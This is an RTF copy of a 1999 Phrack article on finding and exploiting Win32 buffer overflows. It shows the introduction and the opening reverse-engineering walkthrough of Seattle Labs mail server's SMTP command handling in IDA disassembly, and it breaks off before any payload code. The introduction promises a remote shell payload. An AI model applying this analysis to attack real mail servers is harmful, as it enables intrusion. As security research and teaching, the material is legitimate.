{\rtf1\ansi\ansicpg1252\uc1 \deff0\deflang1036\deflangfe1036{\fonttbl{\f0\froman\fcharset0\fprq2{\*\panose 02020603050405020304}Times New Roman;}{\f1\fswiss\fcharset0\fprq2{\*\panose 020b0604020202020204}Arial;}
{\f2\fmodern\fcharset0\fprq1{\*\panose 02070309020205020404}Courier New;}{\f28\fswiss\fcharset128\fprq2{\*\panose 020b0604020202020204}Arial Unicode MS;}{\f29\fswiss\fcharset128\fprq2{\*\panose 00000000000000000000}@Arial Unicode MS;}
{\f46\froman\fcharset238\fprq2 Times New Roman CE;}{\f47\froman\fcharset204\fprq2 Times New Roman Cyr;}{\f49\froman\fcharset161\fprq2 Times New Roman Greek;}{\f50\froman\fcharset162\fprq2 Times New Roman Tur;}
{\f51\froman\fcharset177\fprq2 Times New Roman (Hebrew);}{\f52\froman\fcharset178\fprq2 Times New Roman (Arabic);}{\f53\froman\fcharset186\fprq2 Times New Roman Baltic;}{\f54\fswiss\fcharset238\fprq2 Arial CE;}{\f55\fswiss\fcharset204\fprq2 Arial Cyr;}
{\f57\fswiss\fcharset161\fprq2 Arial Greek;}{\f58\fswiss\fcharset162\fprq2 Arial Tur;}{\f59\fswiss\fcharset177\fprq2 Arial (Hebrew);}{\f60\fswiss\fcharset178\fprq2 Arial (Arabic);}{\f61\fswiss\fcharset186\fprq2 Arial Baltic;}
{\f62\fmodern\fcharset238\fprq1 Courier New CE;}{\f63\fmodern\fcharset204\fprq1 Courier New Cyr;}{\f65\fmodern\fcharset161\fprq1 Courier New Greek;}{\f66\fmodern\fcharset162\fprq1 Courier New Tur;}{\f67\fmodern\fcharset177\fprq1 Courier New (Hebrew);}
{\f68\fmodern\fcharset178\fprq1 Courier New (Arabic);}{\f69\fmodern\fcharset186\fprq1 Courier New Baltic;}{\f272\fswiss\fcharset0\fprq2 Arial Unicode MS Western;}{\f270\fswiss\fcharset238\fprq2 Arial Unicode MS CE;}
{\f271\fswiss\fcharset204\fprq2 Arial Unicode MS Cyr;}{\f273\fswiss\fcharset161\fprq2 Arial Unicode MS Greek;}{\f274\fswiss\fcharset162\fprq2 Arial Unicode MS Tur;}{\f275\fswiss\fcharset177\fprq2 Arial Unicode MS (Hebrew);}
{\f276\fswiss\fcharset178\fprq2 Arial Unicode MS (Arabic);}{\f277\fswiss\fcharset186\fprq2 Arial Unicode MS Baltic;}}{\colortbl;\red0\green0\blue0;\red0\green0\blue255;\red0\green255\blue255;\red0\green255\blue0;\red255\green0\blue255;
\red255\green0\blue0;\red255\green255\blue0;\red255\green255\blue255;\red0\green0\blue128;\red0\green128\blue128;\red0\green128\blue0;\red128\green0\blue128;\red128\green0\blue0;\red128\green128\blue0;\red128\green128\blue128;\red192\green192\blue192;}
{\stylesheet{\ql \li0\ri0\widctlpar\aspalpha\aspnum\faauto\adjustright\rin0\lin0\itap0 \fs24\lang1036\langfe1036\cgrid\langnp1036\langfenp1036 \snext0 Normal;}{\*\cs10 \additive Default Paragraph Font;}{
\s15\ql \li0\ri0\widctlpar\aspalpha\aspnum\faauto\adjustright\rin0\lin0\itap0 \f2\fs20\lang1036\langfe1036\cgrid\langnp1036\langfenp1036 \sbasedon0 \snext15 Plain Text;}}{\*\revtbl {Unknown;}}{\info{\title -------[  Phrack Magazine --- Vol}{\author Windows 98}
{\operator Windows 98}{\creatim\yr2002\mo6\dy8\hr16\min35}{\revtim\yr2002\mo6\dy8\hr16\min51}{\version5}{\edmins17}{\nofpages24}{\nofwords11376}{\nofchars64846}{\nofcharsws79635}{\vern8249}}\paperw11906\paperh16838\margl1953\margr1953\margt1417\margb1417 
\deftab708\widowctrl\ftnbj\aenddoc\hyphhotz425\noxlattoyen\expshrtn\noultrlspc\dntblnsbdb\nospaceforul\hyphcaps0\formshade\horzdoc\dgmargin\dghspace180\dgvspace180\dghorigin1701\dgvorigin1984\dghshow1\dgvshow1
\jexpand\viewkind4\viewscale100\pgbrdrhead\pgbrdrfoot\splytwnine\ftnlytwnine\htmautsp\nolnhtadjtbl\useltbaln\alntblind\lytcalctblwd\lyttblrtgr\lnbrkrule \fet0\sectd \linex0\headery708\footery708\colsx708\endnhere\sectlinegrid360\sectdefaultcl 
{\*\pnseclvl1\pnucrm\pnstart1\pnindent720\pnhang{\pntxta .}}{\*\pnseclvl2\pnucltr\pnstart1\pnindent720\pnhang{\pntxta .}}{\*\pnseclvl3\pndec\pnstart1\pnindent720\pnhang{\pntxta .}}{\*\pnseclvl4\pnlcltr\pnstart1\pnindent720\pnhang{\pntxta )}}{\*\pnseclvl5
\pndec\pnstart1\pnindent720\pnhang{\pntxtb (}{\pntxta )}}{\*\pnseclvl6\pnlcltr\pnstart1\pnindent720\pnhang{\pntxtb (}{\pntxta )}}{\*\pnseclvl7\pnlcrm\pnstart1\pnindent720\pnhang{\pntxtb (}{\pntxta )}}{\*\pnseclvl8\pnlcltr\pnstart1\pnindent720\pnhang
{\pntxtb (}{\pntxta )}}{\*\pnseclvl9\pnlcrm\pnstart1\pnindent720\pnhang{\pntxtb (}{\pntxta )}}\pard\plain \s15\qj \li0\ri0\widctlpar\aspalpha\aspnum\faauto\adjustright\rin0\lin0\itap0 \f2\fs20\lang1036\langfe1036\cgrid\langnp1036\langfenp1036 {
\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 -------[  Phrack Magazine --- Vol. 9 | Issue 55 --- 09.09.99 --- 15 of 19  ]
\par 
\par \hich\af1\dbch\af28\loch\f1 -------------------------[  Win32 Buffer Overflows
\par \hich\af1\dbch\af28\loch\f1                             \hich\af1\dbch\af28\loch\f1 (Location, Exploitation and Prevention)
\par 
\par \hich\af1\dbch\af28\loch\f1 --------[ dark spyrit AKA Barnaby Jack <dspyrit@beavuh.org>  ]
\par 
\par \hich\af1\dbch\af28\loch\f1 ----[  Abstract
\par 
\par \hich\af1\dbch\af28\loch\f1 "If you assume that there's no hope, you guarantee there will be no hope. If you assume that there is an instinct for freedom, there a\hich\af1\dbch\af28\loch\f1 re opportunities to change things."
\par 
\par \hich\af1\dbch\af28\loch\f1 -Noam Chomsky
\par 
\par \hich\af1\dbch\af28\loch\f1 The Internet - the last great stronghold of freedom of thought, ideas and expression - and with each passing moment the bleak outcome of a corporate and government controlled entity increases in probabili
\hich\af1\dbch\af28\loch\f1 ty.
\par 
\par \hich\af1\dbch\af28\loch\f1 The battle lines have been drawn, and for the moment, we have the upper hand, but only by a margin.
\par 
\par \hich\af1\dbch\af28\loch\f1 Software companies with no alternative but to resort to the censorship of knowledge have made their presence felt, sites relating to the 'black art' o\hich\af1\dbch\af28\loch\f1 
f software reversing and the like are being removed on a continual basis.
\par 
\par \hich\af1\dbch\af28\loch\f1 Hopefully, the few unrestrained who walk the back alleys will continue to publish information - and create avenues for others to expand, spread and develop - this is where the battl\hich\af1\dbch\af28\loch\f1 e will be won.

\par 
\par \hich\af1\dbch\af28\loch\f1 Assembly language is a weapon chosen only by few, but those who possess the skill to harness its power can and will defeat any of the newer tools of modern combat.
\par 
\par \hich\af1\dbch\af28\loch\f1 I wish you the best of luck finding information, though.  With power, comes\hich\af1\dbch\af28\loch\f1 
 a price - Assembler isn't the easiest language to learn, and as such you may have trouble finding documentation among the hordes of Visual this, Visual that, Visual Bloat for Dummies.. but continue your search, you'll be glad you did.
\par 
\par \hich\af1\dbch\af28\loch\f1 When profit gain is\hich\af1\dbch\af28\loch\f1 
 the primary momentum, speed, control, size and performance of your software is sacrificed for ease of use and 'prompt development'. The need to know what goes on internally is a rare necessity and optimisation is of little importance.  Those that remain 
\hich\af1\dbch\af28\loch\f1 u\hich\af1\dbch\af28\loch\f1 
ntainted by the prospect of monetary rewards, and first and foremost are driven by the sheer desire to better educate ones self, are those that will always be on the pinnacle - and are those that are feared most of all.
\par 
\par \hich\af1\dbch\af28\loch\f1 With Windows NT now a major player,\hich\af1\dbch\af28\loch\f1 
 and the open source movement not looking to have any impact in the near future, the ability to 'look under the hood' is an incredibly valuable asset and will be the focus of the first section in this paper.
\par 
\par \hich\af1\dbch\af28\loch\f1 It is of no great surprise that attempts to out\hich\af1\dbch\af28\loch\f1 law reverse engineering are currently in the works, but the effects of such a proposal would be disastrous. 
\par 
\par \hich\af1\dbch\af28\loch\f1 Despite the fact that it is an open invitation for vendors to use sub-standard \hich\af1\dbch\af28\loch\f1 
coding practice, there are those in the security industry who rely on these techniques to find and document vulnerabilities.  The online world would suffer as a result.
\par 
\par \hich\af1\dbch\af28\loch\f1 Do not concede.
\par 
\par }{\b\i\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 Introduction.
\par \hich\af1\dbch\af28\loch\f1 ~~~~~~~~~~~~~
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 
\par \hich\af1\dbch\af28\loch\f1 This paper will be separated into 3 sect\hich\af1\dbch\af28\loch\f1 ions.
\par 
\par \hich\af1\dbch\af28\loch\f1 The first will cover a standard reversing session, and we'll point out a common vulnerability.
\par 
\par \hich\af1\dbch\af28\loch\f1 The second will demonstrate the process of exploiting the weakness \hich\f1 \endash \loch\f1  the problem with most win32 remote overflow exploits stems from the payload, the cur\hich\af1\dbch\af28\loch\f1 
rent trend is to have the shellcode download an external file and execute.
\par 
\par \hich\af1\dbch\af28\loch\f1 Far too many problems result from this technique, depending on router/firewall configurations etc.
\par 
\par \hich\af1\dbch\af28\loch\f1 The payload I present to you will directly spawn a full-blown shell on any port \hich\af1\dbch\af28\loch\f1 you specify, eliminating 90% of most reported problems.  This is the first of its kind as far as I am aware.
\par 
\par \hich\af1\dbch\af28\loch\f1 The last section will show how to add your own code to the executables of your target to prevent exploitation.
\par 
\par \hich\af1\dbch\af28\loch\f1 The example I will be using for th\hich\af1\dbch\af28\loch\f1 
is document is the latest version of Seattle Labs mail server (3.2.3113).  There are numerous buffer overflows riddled throughout this software, we'll be concentrating on a port opened by the POP service, which provides the Extended Turn functions.
\par 
\par \hich\af1\dbch\af28\loch\f1 Seattl\hich\af1\dbch\af28\loch\f1 e Labs were contacted about this in a previous version but did not bother to remedy the situation, instead they just changed the default port from 27 to 8376.
\par 
\par \hich\af1\dbch\af28\loch\f1 Bad move.
\par 
\par \hich\af1\dbch\af28\loch\f1 The vulnerabilities were made public by the way, so please, Russ, don't send me nasty\hich\af1\dbch\af28\loch\f1  emails.
\par 
\par \hich\af1\dbch\af28\loch\f1 
Before we begin I will assume you have a general knowledge of Assembler, Windows programming, a basic understanding of the Portable Executable structure and you know the fundamentals of buffer overflows - I won't be re-hashing the basics in this 
\hich\af1\dbch\af28\loch\f1 paper.
\par 
\par }{\b\i\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 Tools Required:
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 
\par \hich\af1\dbch\af28\loch\f1 Interactive Disassembler from http://www.datarescue.com - hands down the BEST disassembler for the PC.
\par 
\par \hich\af1\dbch\af28\loch\f1 A decent debugger, e.g.: SoftIce.
\par 
\par \hich\af1\dbch\af28\loch\f1 PE Dump from Matt Peitrek, or dumpbin will suffice.
\par 
\par \hich\af1\dbch\af28\loch\f1 A hex editor, any will do.. \hich\af1\dbch\af28\loch\f1 PS Edit does nicely.
\par 
\par \hich\af1\dbch\af28\loch\f1 A Win32 API reference.
\par 
\par \hich\af1\dbch\af28\loch\f1 If you want to assemble the tools/exploits that accompany this paper then you'll also need TASM 5.0.
\par 
\par \hich\af1\dbch\af28\loch\f1 The binaries will be available at http://www.beavuh.org as well as the latest goodies that we feel the need \hich\af1\dbch\af28\loch\f1 to release.
\par 
\par 
\par }{\b\i\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 Section 1: Under the Hood.  
\par \hich\af1\dbch\af28\loch\f1 ~~~~~~~~~~~~~~~~~~~~~~~~~~
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 
\par \hich\af1\dbch\af28\loch\f1 Interactive Disassembler Pro is without a doubt, THE tool for reversing code. Disassembly begins from the entry point of the program, and follows all routes of execution, then continues\hich\af1\dbch\af28\loch\f1 
 to locate functions outside of the main flow of the program.  You have full control over what is marked as data or code.  IDA recognizes a huge amount of library functions, which provides a much better understanding of the target.  It will disassemble an
\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 
unbelievable amount of file formats, from a wide range of processors.  You're given the ability to have repeatable comments, labels, modify any piece of code, function, "interactively".  IDA also includes it's own macro language, to automate your chores.

\par 
\par \hich\af1\dbch\af28\loch\f1 If I were to cover everything this tool can do I would be here all day, and I'd still be missing something.
\par 
\par \hich\af1\dbch\af28\loch\f1 With the combined effort of IDA and Soft Ice, there are no barriers.
\par 
\par \hich\af1\dbch\af28\loch\f1 This section will be rather short, the only reason being that IDA cuts throug\hich\af1\dbch\af28\loch\f1 h SLMail's code like a machete.
\par 
\par \hich\af1\dbch\af28\loch\f1 Load up slmail.exe into IDA and we'll get underway...
\par 
\par 
\par \hich\af1\dbch\af28\loch\f1 First we need to think about our target for a minute, we're going to try and exploit one of the SMTP commands so it is almost certain they will be accessed \hich\af1\dbch\af28\loch\f1 
and compared from a table.. Let's do a search:
\par 
\par \hich\af1\dbch\af28\loch\f1 Hit <alt+b> "search for text in core" and enter "EXPN", we'll land smack in the middle of these ASCII strings.
\par 
\par \hich\af1\dbch\af28\loch\f1 004439C0 aSize           db 'SIZE',0
\par \hich\af1\dbch\af28\loch\f1 004439C5                 align 4
\par \hich\af1\dbch\af28\loch\f1 004439C8 aXtrn           d\hich\af1\dbch\af28\loch\f1 b 'XTRN',0
\par \hich\af1\dbch\af28\loch\f1 004439CD                 align 4
\par \hich\af1\dbch\af28\loch\f1 004439D0 aEtrn           db 'ETRN',0
\par \hich\af1\dbch\af28\loch\f1 004439D5                 align 4
\par \hich\af1\dbch\af28\loch\f1 004439D8 aQuit           db 'QUIT',0             ; DATA XREF: sub_403970+280_o
\par \hich\af1\dbch\af28\loch\f1 004439D8                                         ; .data:00448A\hich\af1\dbch\af28\loch\f1 60_o
\par \hich\af1\dbch\af28\loch\f1 004439DD                 align 4
\par \hich\af1\dbch\af28\loch\f1 004439E0 aHelp_0         db 'HELP',0
\par \hich\af1\dbch\af28\loch\f1 004439E5                 align 4
\par \hich\af1\dbch\af28\loch\f1 004439E8 aTurn           db 'TURN',0             ; DATA XREF: sub_403970+F0_o
\par \hich\af1\dbch\af28\loch\f1 004439ED                 align 4
\par \hich\af1\dbch\af28\loch\f1 004439F0 aExpn           db 'EXPN',0 \hich\af1\dbch\af28\loch\f1    
\par 
\par \hich\af1\dbch\af28\loch\f1 ...<snip>
\par 
\par \hich\af1\dbch\af28\loch\f1 Now we need to find the table that references the commands, so we'll do another search.. this time entering the dword offset to the left of EXPN (004439f0).
\par 
\par \hich\af1\dbch\af28\loch\f1 And we land in the middle of this mess:
\par 
\par \hich\af1\dbch\af28\loch\f1 004436F8 dword_4436F8    dd 443A98h      \hich\af1\dbch\af28\loch\f1         ; DATA XREF: sub_404390+24_r
\par \hich\af1\dbch\af28\loch\f1 004436F8                                         ; sub_404390+34_o
\par \hich\af1\dbch\af28\loch\f1 004436FC                 db    3 ;  
\par }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 004436FD                 db    0 ;  
\par \hich\af1\dbch\af28\loch\f1 004436FE                 db    0 ;  
\par \hich\af1\dbch\af28\loch\f1 004436FF                 db    0 ;  
\par \hich\af1\dbch\af28\loch\f1 00443700                 db  94h ; "
\par \hich\af1\dbch\af28\loch\f1 00443701                 db  3Ah ; :
\par \hich\af1\dbch\af28\loch\f1 00443702                 db  44h ; D
\par \hich\af1\dbch\af28\loch\f1 00443703                 db    0 ;  
\par \hich\af1\dbch\af28\loch\f1 00443704                 db  0Ah ;  
\par \hich\af1\dbch\af28\loch\f1 00443705                 db    0 ;  
\par \hich\af1\dbch\af28\loch\f1 00443706                 db    0 ;\hich\af1\dbch\af28\loch\f1   
\par \hich\af1\dbch\af28\loch\f1 00443707                 db    0 ;  
\par \hich\af1\dbch\af28\loch\f1 00443708                 db  90h ; 
\par \hich\af1\dbch\af28\loch\f1 00443709                 db  3Ah ; :
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 0044370A                 db  44h ; D
\par }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 0044370B                 db    0 ;  
\par \hich\af1\dbch\af28\loch\f1 0044370C                 db    1 ;  
\par \hich\af1\dbch\af28\loch\f1 0044370D                 db    0\hich\af1\dbch\af28\loch\f1  ;  
\par \hich\af1\dbch\af28\loch\f1 0044370E                 db    0 ;  
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 0044370F                 db    0 ;  
\par 
\par \hich\af1\dbch\af28\loch\f1 ...<snip>
\par 
\par }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 004437E8                 db 0F0h ; 
\par \hich\af1\dbch\af28\loch\f1 004437E9                 db  39h ; 9
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 004437EA                 db  44h ; D
\par }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 004437EB                 db    0 ;  
\par \hich\af1\dbch\af28\loch\f1 004437EC          \hich\af1\dbch\af28\loch\f1        db  19h ;  
\par }{\fs16\lang1043\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1043 \hich\af1\dbch\af28\loch\f1 004437ED                 db    0 ;  
\par \hich\af1\dbch\af28\loch\f1 004437EE                 db    0 ;  
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 004437EF                 db    0 ;  
\par 
\par \hich\af1\dbch\af28\loch\f1 There's no point showing the complete table here, now.. take a look at its structure.
\par 
\par \hich\af1\dbch\af28\loch\f1 <pointer to string> <dword> <pointer to string> <dword> etc
\par 
\par \hich\af1\dbch\af28\loch\f1 My best guess here is that the dword value following each pointer will be the value assigned after a successful comparison. Let's check our theory.  Also we should note down our value after the p\hich\af1\dbch\af28\loch\f1 
ointer to "EXPN" : 004439f0h, 00000019h. 
\par 
\par \hich\af1\dbch\af28\loch\f1 0x19, we'll keep that in mind.
\par 
\par \hich\af1\dbch\af28\loch\f1 Scroll up and at the top of the table you see:
\par 
\par \hich\af1\dbch\af28\loch\f1 004436F8 dword_4436F8    dd 443A98h              ; DATA XREF: sub_404390+24_r
\par \hich\af1\dbch\af28\loch\f1 004436F8                                         ; sub_\hich\af1\dbch\af28\loch\f1 404390+34_o
\par 
\par \hich\af1\dbch\af28\loch\f1 You can see to the right where the table is referenced, so click on the subroutine and we'll land straight into the call.
\par 
\par }{\fs16\loch\af1\hich\af1\dbch\af28 \hich\af1\dbch\af28\loch\f1 004043B4 loc_4043B4:                             ; CODE XREF: sub_404390+11_j
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 004043B4                 mov     ecx, dwor\hich\af1\dbch\af28\loch\f1 d_4436F8
\par \hich\af1\dbch\af28\loch\f1 004043BA                 test    ecx, ecx
\par \hich\af1\dbch\af28\loch\f1 004043BC                 jz      short loc_4043F3 
\par \hich\af1\dbch\af28\loch\f1 004043BE                 mov     ebp, ds:lstrlenA
\par \hich\af1\dbch\af28\loch\f1 004043C4                 mov     esi, offset dword_4436F8
\par 
\par \hich\af1\dbch\af28\loch\f1 Our table loaded at esi, ebp contains the add\hich\af1\dbch\af28\loch\f1 ress of lstrlenA.
\par 
\par }{\fs16\loch\af1\hich\af1\dbch\af28 \hich\af1\dbch\af28\loch\f1 004043C9 
\par \hich\af1\dbch\af28\loch\f1 004043C9 loc_4043C9:                             ; CODE XREF: sub_404390+61_j
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 004043C9                 test    eax, eax
\par \hich\af1\dbch\af28\loch\f1 004043CB                 jnz     short loc_4043F3
\par \hich\af1\dbch\af28\loch\f1 004043CD                 mov     eax, [esi]
\par \hich\af1\dbch\af28\loch\f1 004043CF                 push    eax
\par \hich\af1\dbch\af28\loch\f1 004043D0                 call    ebp
\par 
\par \hich\af1\dbch\af28\loch\f1 Here we go, the string first moved to eax and then a string length function called.
\par 
\par \hich\af1\dbch\af28\loch\f1 004043D2                 mov     ecx, [esi]
\par \hich\af1\dbch\af28\loch\f1 004043D4                 push    eax
\par \hich\af1\dbch\af28\loch\f1 004043D5       \hich\af1\dbch\af28\loch\f1           push    ecx
\par \hich\af1\dbch\af28\loch\f1 004043D6                 push    ebx
\par \hich\af1\dbch\af28\loch\f1 004043D7                 call    j_lstrncmpi
\par }{\fs16\loch\af1\hich\af1\dbch\af28 \hich\af1\dbch\af28\loch\f1 004043DC                 neg     eax
\par \hich\af1\dbch\af28\loch\f1 004043DE                 sbb     eax, eax
\par \hich\af1\dbch\af28\loch\f1 004043E0                 inc     eax
\par }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 004043E1                 jz      sho\hich\af1\dbch\af28\loch\f1 rt loc_4043E9
\par 
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 Now we know that the parameters for lstrncmpi are as follows:
\par 
\par \hich\af1\dbch\af28\loch\f1 strncmpi(first_string, second_string, number_of_chars);
\par 
\par \hich\af1\dbch\af28\loch\f1 The first parameter pushed on the stack is the return from the string length function, ecx is then pushed which points to\hich\af1\dbch\af28\loch\f1 
 the string, and finally ebx. So we can determine from this that ebx contains the input from the user. I can see that some of you may be a little puzzled here, yes \hich\f1 \endash \loch\f1  parameters are pushed on to the stack in reverse order.
\par 
\par }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 004043E3                 xor     \hich\af1\dbch\af28\loch\f1 edi, edi
\par \hich\af1\dbch\af28\loch\f1 004043E5                 mov     di, [esi+4]
\par 
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 Ah, just as we suspected.. if there is a successful comparison then di is loaded with the value that followed our pointer.
\par 
\par }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 004043E9 
\par \hich\af1\dbch\af28\loch\f1 004043E9 loc_4043E9:                             ; CODE XREF: sub_404390+51_j
\par \hich\af1\dbch\af28\loch\f1 004043E9                 mov     ecx, [esi+8]
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 004043EC                 add     esi, 8
\par \hich\af1\dbch\af28\loch\f1 004043EF                 test    ecx, ecx
\par \hich\af1\dbch\af28\loch\f1 004043F1                 jnz     short loc_4043C9
\par 
\par \hich\af1\dbch\af28\loch\f1 loop :)
\par 
\par \hich\af1\dbch\af28\loch\f1 004043F3 
\par \hich\af1\dbch\af28\loch\f1 004043F3 loc_4043F3:                             ; CODE XREF: sub_404390+18_j
\par \hich\af1\dbch\af28\loch\f1 004043F3                                         ; sub_404390+2C_j ...
\par \hich\af1\dbch\af28\loch\f1 004043F3                 mov     eax, edi       
\par \hich\af1\dbch\af28\loch\f1 004043F5                 pop     edi
\par \hich\af1\dbch\af28\loch\f1 0\hich\af1\dbch\af28\loch\f1 04043F6                 pop     esi
\par \hich\af1\dbch\af28\loch\f1 004043F7                 pop     ebp
\par \hich\af1\dbch\af28\loch\f1 004043F8                 pop     ebx
\par \hich\af1\dbch\af28\loch\f1 004043F9                 retn    
\par \hich\af1\dbch\af28\loch\f1 004043F9 sub_404390      endp ; sp = -10h
\par \hich\af1\dbch\af28\loch\f1 004043F9 
\par 
\par \hich\af1\dbch\af28\loch\f1 And finally eax holds our value, and we return from the cal\hich\af1\dbch\af28\loch\f1 l.  Let's continue.
\par 
\par \hich\af1\dbch\af28\loch\f1 00405EC7                 mov     edx, [esp+2Ch+arg_8]
\par \hich\af1\dbch\af28\loch\f1 00405ECB                 mov     ebx, eax
\par \hich\af1\dbch\af28\loch\f1 00405ECD                 mov     eax, [esp+2Ch+arg_4]
\par \hich\af1\dbch\af28\loch\f1 00405ED1                 push    edx
\par \hich\af1\dbch\af28\loch\f1 00405ED2                 push    eax
\par \hich\af1\dbch\af28\loch\f1 00405ED3                 push    esi
\par \hich\af1\dbch\af28\loch\f1 00405ED4                 lea     ecx, [esp+3Ch]
\par \hich\af1\dbch\af28\loch\f1 00405ED8                 push    edi
\par \hich\af1\dbch\af28\loch\f1 00405ED9                 push    ecx
\par \hich\af1\dbch\af28\loch\f1 00405EDA                 push    ebx
\par \hich\af1\dbch\af28\loch\f1 00405EDB                 call    sub_404850
\par 
\par \hich\af1\dbch\af28\loch\f1 Now, the import\hich\af1\dbch\af28\loch\f1 
ant things to take note of here is edx gets our inputted string, and ebx is given our value from the table (0x19).  Remember the order in which our registers were pushed, so we will be able to tell what is being referenced from the stack - and in the next
\hich\af1\dbch\af28\loch\f1  \hich\af1\dbch\af28\loch\f1 call we will rename the stack variables to make it easier on ourselves.
\par 
\par \hich\af1\dbch\af28\loch\f1 Note: I'm not taking advantage of some of the GREAT features IDA possesses - repeatable comments, labels and much more.  A necessity while on a real reversing journey.
\par 
\par \hich\af1\dbch\af28\loch\f1 00404850 sub_4\hich\af1\dbch\af28\loch\f1 04850      proc near               ; CODE XREF: sub_405330+73_p
\par \hich\af1\dbch\af28\loch\f1 00404850                                         ; sub_405560+73_p ...
\par \hich\af1\dbch\af28\loch\f1 00404850 
\par \hich\af1\dbch\af28\loch\f1 00404850 var_270         = byte ptr -270h
\par }{\fs16\lang1043\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1043 \hich\af1\dbch\af28\loch\f1 00404850 var_26C         = dword ptr -26Ch
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 00404850 var_268         =\hich\af1\dbch\af28\loch\f1  byte ptr -268h
\par \hich\af1\dbch\af28\loch\f1 00404850 var_264         = byte ptr -264h
\par \hich\af1\dbch\af28\loch\f1 00404850 var_23C         = byte ptr -23Ch
\par \hich\af1\dbch\af28\loch\f1 00404850 var_230         = byte ptr -230h
\par \hich\af1\dbch\af28\loch\f1 00404850 var_168         = byte ptr -168h
\par \hich\af1\dbch\af28\loch\f1 00404850 var_110         = byte ptr -110h
\par \hich\af1\dbch\af28\loch\f1 00404850 var_105         = byt\hich\af1\dbch\af28\loch\f1 e ptr -105h
\par \hich\af1\dbch\af28\loch\f1 00404850 var_104         = byte ptr -104h
\par }{\fs16\lang1043\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1043 \hich\af1\dbch\af28\loch\f1 00404850 var_10          = dword ptr -10h
\par \hich\af1\dbch\af28\loch\f1 00404850 var_4           = dword ptr -4
\par \hich\af1\dbch\af28\loch\f1 00404850 our_val         = dword ptr  4
\par \hich\af1\dbch\af28\loch\f1 00404850 arg_4           = dword ptr  8
\par \hich\af1\dbch\af28\loch\f1 00404850 arg_8           = dword ptr  0C\hich\af1\dbch\af28\loch\f1 h
\par \hich\af1\dbch\af28\loch\f1 00404850 arg_C           = dword ptr  10h
\par \hich\af1\dbch\af28\loch\f1 00404850 arg_10          = dword ptr  14h
\par }{\fs16\lang2057\langfe1036\loch\af1\hich\af1\dbch\af28\langnp2057 \hich\af1\dbch\af28\loch\f1 00404850 our_input       = dword ptr  18h
\par \hich\af1\dbch\af28\loch\f1 00404850 
\par \hich\af1\dbch\af28\loch\f1 00404850                 mov     ecx, [esp+our_val]
\par \hich\af1\dbch\af28\loch\f1 00404854                 sub     esp, 26Ch
\par \hich\af1\dbch\af28\loch\f1 0040485A                 xor     eax, eax
\par \hich\af1\dbch\af28\loch\f1 0040485C                 cmp     ecx, 8
\par \hich\af1\dbch\af28\loch\f1 0040485F                 push    ebx
\par \hich\af1\dbch\af28\loch\f1 00404860                 push    ebp
\par \hich\af1\dbch\af28\loch\f1 00404861                 push    esi
\par \hich\af1\dbch\af28\loch\f1 00404862                 push    edi
\par \hich\af1\dbch\af28\loch\f1 00404863                 j\hich\af1\dbch\af28\loch\f1 nz     loc_4048E9
\par 
\par \hich\af1\dbch\af28\loch\f1 We rename the useful stack arguments to something easier to remember, arg_0 = our_val, and arg_14 = our_input - if you're lost go back and take another look at the order the registers were pushed.
\par 
\par \hich\af1\dbch\af28\loch\f1 ecx is loaded with our 0x19 value.  It \hich\af1\dbch\af28\loch\f1 is then compared to 8, which is not us, so we'll follow the jump.
\par 
\par }{\fs16\lang1031\langfe1036\loch\af1\hich\af1\dbch\af28\langnp1031 \hich\af1\dbch\af28\loch\f1 004048E9 
\par \hich\af1\dbch\af28\loch\f1 004048E9 loc_4048E9:                             ; CODE XREF: sub_404850+13_j
\par \hich\af1\dbch\af28\loch\f1 004048E9                 cmp     ecx, 17h
